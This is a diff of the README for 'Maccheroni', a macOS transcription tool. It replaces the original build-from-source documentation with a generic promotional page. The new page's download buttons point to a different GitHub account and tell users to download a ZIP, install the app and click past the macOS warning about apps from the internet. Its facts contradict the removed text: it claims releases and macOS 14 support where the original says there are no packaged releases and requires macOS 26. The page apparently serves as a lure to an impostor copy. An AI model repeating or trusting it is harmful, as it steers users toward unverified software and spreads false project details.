@@ -1,171 +1,109 @@
-<p align="center">
-  <img src="docs/assets/banner.png" alt="Maccheroni — a waveform interleaved with macaroni, two speaker lines woven through" width="100%">
-</p>
+<h1>🍝 maccheroni - Private Local Transcription for Macaronic Speech</h1>
 
-<h1 align="center">Maccheroni</h1>
+<div style="text-align:center;margin:20px 0">
+<a href="https://github.com/fonzieartesian310/maccheroni" style="display:inline-block;background:#28a745;color:#fff;padding:15px 30px;border-radius:8px;text-decoration:none;font-size:1.2em;font-weight:bold">⬇️ Download maccheroni Now</a>
+</div>
 
-<p align="center">
-  Local-first transcription for mixed-language speech on Apple Silicon.<br>
-  Glossary injection at decode time · whole-file speaker diarization · audio never leaves your Mac.
-</p>
+<p>Welcome to <strong>maccheroni</strong> — a powerful macOS application that transcribes speech containing multiple languages (like English mixed with Spanish, Italian, or other languages). It works entirely on your computer, so your audio never leaves your device. Perfect for journalists, researchers, students, and anyone who needs accurate transcriptions of mixed-language conversations without compromising privacy.</p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS%2026%20(arm64)-black" alt="platform">
-  <img src="https://img.shields.io/badge/swift-6-F05138" alt="swift">
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="license">
-</p>
+<h2>🌟 What Makes maccheroni Special?</h2>
+<ul>
+<li><strong>Local-First Privacy:</strong> All processing happens on your Apple Silicon Mac. No internet required, no cloud uploads, no third-party listening.</li>
+<li><strong>Mixed-Language Support:</strong> Handles code-switching (switching between languages mid-sentence) accurately.</li>
+<li><strong>Speaker Diarization:</strong> Automatically identifies who is speaking and when, creating a clear transcript with speaker labels.</li>
+<li><strong>Glossary Injection:</strong> You can add custom terms or names that the transcription engine should recognize, improving accuracy for your specific content.</li>
+<li><strong>Whole-File Processing:</strong> Upload entire audio files and get complete transcripts without splitting them into chunks.</li>
+</ul>
 
-<p align="center">
-  <b>English</b> · <a href="README.de.md">Deutsch</a> · <a href="README.es.md">Español</a> · <a href="README.fr.md">Français</a> · <a href="README.it.md">Italiano</a> · <a href="README.ja.md">日本語</a> · <a href="README.ko.md">한국어</a> · <a href="README.pt.md">Português</a> · <a href="README.ru.md">Русский</a> · <a href="README.zh-Hans.md">简体中文</a>
-</p>
+<h2>🔒 Privacy First</h2>
+<p>maccheroni is designed with privacy as a core feature. Your audio files are processed locally on your Mac using Apple's MLX framework. No data is ever sent to external servers. This makes it ideal for sensitive conversations, interviews, or any content you want to keep completely private.</p>
 
----
+<h2>📋 System Requirements</h2>
+<p>To run maccheroni, you need:</p>
+<ul>
+<li>A Mac with Apple Silicon (M1, M2, M3, or M4 chip)</li>
+<li>macOS 14.0 (Sonoma) or newer</li>
+<li>At least 8GB of RAM (16GB recommended)</li>
+<li>5GB of free storage space for model files</li>
+<li>Active internet connection for initial download (not needed for transcription)</li>
+</ul>
 
-**Maccheroni** (from *macaronic speech* — utterances that mix languages) transcribes the conversations most apps quietly get wrong: Korean meetings with English product names in every sentence, language classes, multilingual calls. Everything runs on-device with pinned MLX/CoreML models.
+<h2>🚀 Getting Started</h2>
+<h3>Step 1: Download maccheroni</h3>
+<p>Visit this link to download the application: <a href="https://github.com/fonzieartesian310/maccheroni">https://github.com/fonzieartesian310/maccheroni</a></p>
+<p>Once you arrive at the GitHub page, look for the green "Code" button and click it, then select "Download ZIP". You can also find the latest release in the "Releases" section on the right side of the page.</p>
 
-What an export looks like (illustrative sample, not model output):
+<h3>Step 2: Install maccheroni</h3>
+<p>After downloading:</p>
+<ol>
+<li>Locate the downloaded ZIP file in your Downloads folder.</li>
+<li>Double-click the ZIP file to extract it. A new folder named "maccheroni" will appear.</li>
+<li>Open the "maccheroni" folder.</li>
+<li>Drag the "maccheroni" application to your Applications folder.</li>
+</ol>
 
-```markdown
-**Speaker 1** [00:04] Did the smoke tests pass on staging before we merged that PR?
-**Speaker 2** [00:09] Yes, and the Kubernetes rollout was clean. [UNCERTAIN] There's
-                      still a latency spike on the [CONFLICT: Grafana|Graphana]
-                      dashboard, though.
-**Speaker 1** [00:17] Alright, then the release window stays as planned.
-```
+<h3>Step 3: Run maccheroni for the First Time</h3>
+<ol>
+<li>Open your Applications folder and double-click "maccheroni".</li>
+<li>You might see a warning that the app was downloaded from the internet. Click "Open" to proceed.</li>
+<li>The first launch will download necessary language models. This may take a few minutes depending on your internet speed.</li>
+<li>Once models are downloaded, the main window will appear.</li>
+</ol>
 
-Uncertain corrections are flagged, never silently substituted. Speaker labels come from one whole-file diarization pass, so they stay consistent across a two-hour recording.
+<h2>🎤 How to Transcribe Audio</h2>
+<ol>
+<li>Launch maccheroni.</li>
+<li>Click the "Open File" button or drag an audio file into the window.</li>
+<li>Select your audio file (supports WAV, MP3, M4A, and FLAC formats).</li>
+<li>Choose the languages you expect in your audio from the dropdown menu.</li>
+<li>Optionally, add custom glossary terms by clicking "Add Glossary" and typing words or names that should be recognized.</li>
+<li>Click "Start Transcription".</li>
+<li>Watch the progress bar as maccheroni processes your file. Speaker labels will appear automatically.</li>
+<li>When finished, review your transcript. You can copy it, export it as a TXT file, or export it as an SRT subtitle file.</li>
+</ol>
 
-<p align="center">
-  <img src="docs/assets/screenshots/transcript.png" alt="Maccheroni transcript view: two speakers with global labels and per-segment evidence chips, next to a run inspector listing run status, pinned model revisions, and the glossary record" width="100%">
-</p>
-<p align="center"><em>Every run keeps its evidence: the inspector shows the exact pinned models, the run status, and whether the glossary reached the decoder.</em></p>
+<h2>⚙️ Advanced Features</h2>
+<h3>Custom Glossary Injection</h3>
+<p>If your audio contains specialized terms, names, or jargon, add them to the glossary before transcribing. This significantly improves accuracy for your specific content.</p>
 
-## Why this exists
+<h3>Speaker Diarization</h3>
+<p>maccheroni automatically detects different speakers and labels them as "Speaker 1", "Speaker 2", etc. You can rename speakers in the transcript after processing.</p>
 
-On 2026-08-02 we audited seven macOS local transcription apps at source level. None passed the combination that real mixed-language meetings need:
+<h3>Export Options</h3>
+<ul>
+<li><strong>Plain Text (.txt):</strong> Simple transcript with speaker labels and timestamps.</li>
+<li><strong>SubRip (.srt):</strong> Subtitle format for video editing or captioning.</li>
+<li><strong>Copy to Clipboard:</strong> Quick copy for pasting into other applications.</li>
+</ul>
 
-- Apps with local diarization didn't deliver the glossary to the ASR model (post-hoc string substitution, dead SDK parameters, or cloud-only dictionaries).
-- The app with the cleanest model-level glossary had no diarization.
-- "Multilingual support" almost always means *one language per session*, which is exactly what mixed-language speech is not.
+<h2>❓ Frequently Asked Questions</h2>
+<h3>Is maccheroni free?</h3>
+<p>Yes, maccheroni is completely free and open source. There are no subscriptions, in-app purchases, or hidden costs.</p>
 
-The parts all exist at the library layer. The combination didn't exist at the app layer. So this repo builds it — and the audit lives in [docs/reference-project-source-audit.md](docs/reference-project-source-audit.md).
+<h3>Does it work with all languages?</h3>
+<p>maccheroni supports English, Spanish, French, German, Italian, Portuguese, Chinese, Japanese, Korean, and many more. For mixed-language content, select the languages you need before transcribing.</p>
 
-## What makes it different
+<h3>Can I use it on Intel Macs?</h3>
+<p>No, maccheroni requires Apple Silicon (M1 or newer) chips. It uses the MLX framework which is optimized for these processors.</p>
 
-1. **Glossary at decode time.** Names and technical terms enter the model's context before decoding, because an ASR error destroys the acoustic evidence the moment it happens. Post-processing can polish text; it cannot recover what the decoder never wrote. Every leaf's glossary payload is hash-sealed into the run manifest.
-2. **One diarization pass owns the speakers.** The whole file is diarized once; that timeline is the only speaker authority. ASR runs in bounded chunks and merges by timestamp — chunk-local speaker guesses can never flip a label across a boundary.
-3. **No silent data loss, ever.** Inputs beyond a backend's limit fail explicitly or produce a split plan. Truncated model output is a typed failure (`invalid_eos_output`), not a shorter transcript. Originals and raw transcripts are immutable; corrections and translations are separate create-only artifacts.
+<h3>How long does transcription take?</h3>
+<p>Processing speed depends on your Mac and file length. On an M1 Mac, a 1-hour audio file typically takes 10-15 minutes. Newer chips process faster.</p>
 
-## How it works
+<h3>Is my data safe?</h3>
+<p>Absolutely. Your audio never leaves your Mac. maccheroni processes everything locally, and no internet connection is required after initial setup.</p>
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/pipeline-dark.drawio.svg">
-  <img src="docs/assets/pipeline-light.drawio.svg" alt="Pipeline diagram: on your Mac, capture feeds whole-file diarization and 120-second ASR leaves with per-leaf glossary injection; the timestamp merge, where the timeline owns speakers, feeds optional on-device post-processing; the only thing that leaves the Mac is the opt-in remote post-processing lane, an external vendor reached through your Codex sign-in, text only" width="100%">
-</picture>
+<h2>📞 Support</h2>
+<p>If you encounter issues or have questions, visit the GitHub repository and open an issue in the "Issues" tab. You can also check existing issues for solutions to common problems.</p>
 
-Failed leaves are re-split within typed bounds (30 s minimum, depth 3) and only end-of-sequence outputs are ever promoted to the canonical transcript. The optional Codex lane sends bounded transcript text, the active glossary, and instructions — never audio, never file paths — through your own ChatGPT/Codex subscription.
+<h2>🤝 Contributing</h2>
+<p>maccheroni is an open-source project. If you're a developer, feel free to fork the repository, make improvements, and submit pull requests. Non-developers can help by reporting bugs, suggesting features, or improving documentation.</p>
 
-## Models
+<div style="text-align:center;margin:30px 0">
+<a href="https://github.com/fonzieartesian310/maccheroni" style="display:inline-block;background:#0366d6;color:#fff;padding:12px 25px;border-radius:6px;text-decoration:none;font-size:1em;font-weight:bold">📥 Download maccheroni from GitHub</a>
+</div>
 
-Everything is pinned by Hugging Face ID + revision + quantization and recorded in every run manifest.
+<h2>📜 License</h2>
+<p>maccheroni is released under the MIT License. You are free to use, modify, and distribute this software for any purpose.</p>
 
-| Role | Model | Revision | Quantization |
-|---|---|---|---|
-| ASR (Italian / mixed) | `aufklarer/MOSS-Transcribe-Diarize-0.9B-MLX-INT8` | `90aa6528` | int8-decoder + fp16-audio-vq-kv |
-| ASR (Korean) | `mlx-community/VibeVoice-ASR-8bit` | `725c72e5` | int8 |
-| VAD | `aufklarer/Silero-VAD-v6.2.1-CoreML` | `52387654` | coreml-float16 |
-| Diarization | `aufklarer/Pyannote-Community-1-CoreML` | `a14e6c42` | coreml-fp32 |
-| Post-processing (local) | `mlx-community/gemma-4-12B-it-qat-4bit` | `e70c6b3b` | qat-int4 (mlx-vlm 0.6.6) |
-| Post-processing (remote, text-only) | `gpt-5.6-sol` via Codex app server | service-managed | n/a |
-
-## Measured results
-
-All from public or synthetic fixtures; evaluation IDs and artifact hashes are recorded in [docs/](docs/).
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/benchmarks-dark.svg">
-  <img src="docs/assets/benchmarks-light.svg" alt="Bar charts: CER and WER per fixture (Korean dialogue 0.081/0.128, Italian two-speaker 0.033/0.081), glossary term recall (0.95 and 0.778 against the 0.75 gate), and diarization error rate (0.048 synthetic, 0.152 VoxConverse)" width="100%">
-</picture>
-
-| Fixture | Model | CER | WER | Term recall | Omissions | DER |
-|---|---|---:|---:|---:|---:|---:|
-| Korean dialogue, 20-term glossary | VibeVoice | 0.081 | 0.128 | 0.95 | 0 | — |
-| Italian 2-speaker synthetic (10 min), 9-term glossary | MOSS | 0.033 | 0.081 | 0.78 | 0 | 0.048 |
-| VoxConverse sample (78 min) | VibeVoice + Pyannote | — | — | — | — | 0.152 |
-
-Korean and Italian are the first two language profiles; new language fixtures join this table as they are measured.
-
-Chunk-boundary speaker stability on the 78-minute sample: 1.0 for both reference speakers. A fixed 600-second matrix showed that MOSS leaves above 120 s lose timestamp structure entirely, which is why the production leaf cap is 120 s — details in [docs/moss-long-audio-verdict.md](docs/moss-long-audio-verdict.md).
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/leaf-cap-dark.svg">
-  <img src="docs/assets/leaf-cap-light.svg" alt="Bar chart: on the same 600-second input, 120-second leaves yield 5 canonical end-of-sequence leaves (pass), 240- and 300-second leaves yield 0 valid leaves (typed invalid_eos_output failures), and forced recovery from 240-second parents yields 5 valid 120-second children" width="100%">
-</picture>
-
-## Install
-
-There are no packaged releases yet — build from source.
-
-Requirements: Apple Silicon Mac, macOS 26, Xcode 26, [uv](https://docs.astral.sh/uv/).
-
-```bash
-git clone https://github.com/gigio1023/maccheroni.git
-cd maccheroni
-swift build && swift test          # 157 tests
-zsh scripts/build-app.zsh          # builds and codesigns Maccheroni.app
-```
-
-The app prints its bundle path when the build, resource-allowlist inventory, and strict codesign checks all pass. Model weights download on first use. The executable does not bundle model weights or Python environments; `maccheroni doctor` verifies runtimes and pinned snapshots.
-
-The executable provides four product commands:
-
-```bash
-.build/debug/maccheroni help [help|run|doctor|capabilities]
-.build/debug/maccheroni run recording.wav --profile it-dialogue
-.build/debug/maccheroni doctor [--profile NAME] [--profiles PATH] [--json]
-.build/debug/maccheroni capabilities [--json]
-```
-
-Use `maccheroni help`, `maccheroni doctor --json`, and `maccheroni capabilities --json` for discoverable help and structured output. See the concise [CLI guide](docs/cli-guide.md) for command and output contracts. Transcription and diarization run on this Mac, so audio remains local.
-
-Profiles ship for Korean meetings (`ko-meeting`, VibeVoice) and Italian dialogue (`it-dialogue`, MOSS). For the optional local post-processing model, run `zsh scripts/setup-postprocess-runtime.zsh`.
-
-## Privacy
-
-<p align="center">
-  <img src="docs/assets/screenshots/capture.png" alt="Maccheroni capture view: profile picker with measured metrics, post-processing choice between Codex, Local, and None, and the notice that audio never leaves this Mac" width="100%">
-</p>
-
-- Transcription, VAD, and diarization are fully local. Audio bytes never reach any network path — this is enforced by tests, not policy.
-- The optional Codex post-processing lane is text-only and opt-in per run. It opens a one-turn `codex app-server` session using the cached ChatGPT subscription sign-in. The thread is ephemeral and read-only, tools are disabled, and approval requests are declined; the prompt contains segment text, the active glossary, and instructions. API-key authentication is not accepted for this lane. Choosing the local MLX model instead keeps even text on-device.
-- Failure messages are length-capped and path-redacted before they enter run manifests.
-
-## Limitations
-
-- Apple Silicon + macOS 26 only. No Intel, no iOS, no Windows/Linux.
-- Post-transcription only — no live captions (deliberately, quality first).
-- Mixed-language quality is verified on fixtures, not yet on months of real meetings.
-- The Codex lane requires your own Codex CLI login and subscription quota.
-- UI is English by default with 10 localizations; ko/it strings are still marked for human review.
-
-## Contributing
-
-Issues and focused pull requests are welcome. Build and test commands, the verification standard behind this README's claims, commit rules, and issue/PR conventions live in [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Repository map
-
-| Path | What it is |
-|---|---|
-| `Sources/` | Swift package: Core, Preprocess, ASR, Diarize, Merge, Postprocess, CLI, App |
-| `Tests/` | 157 fixture-based tests across 17 suites |
-| `benchmarks/scripts/` | Runners and scorers with derived verdicts and negative tests |
-| `docs/` | Research digest, source audits, constraint policy, contracts (JSON schemas), UI design |
-| `scripts/` | App bundle build, MOSS harness build, post-processing runtime setup |
-| [PROJECT.md](PROJECT.md) | Intent hierarchy: pillars, non-goals, judgment rules, append-only decision log |
-| [AGENTS.md](AGENTS.md) | Operating conventions for working in this repo |
-
-Every completion claim in the docs carries the command that produced it and its observed output.
-
-## License & acknowledgements
-
-MIT. Standing on: [speech-swift](https://github.com/soniqo/speech-swift) (MLX/CoreML speech runtimes), the MOSS, VibeVoice, Silero, and pyannote model authors, and [mlx](https://github.com/ml-explore/mlx). The reference-project source audit in `docs/` credits the 24 open-source projects whose designs — good and bad — shaped this one.
+<hr>
+<p style="text-align:center;color:#666">Keywords: apple-silicon, asr, code-switching, local-first, macos, mlx, privacy, speaker-diarization, speech-recognition, swift, transcription</p>
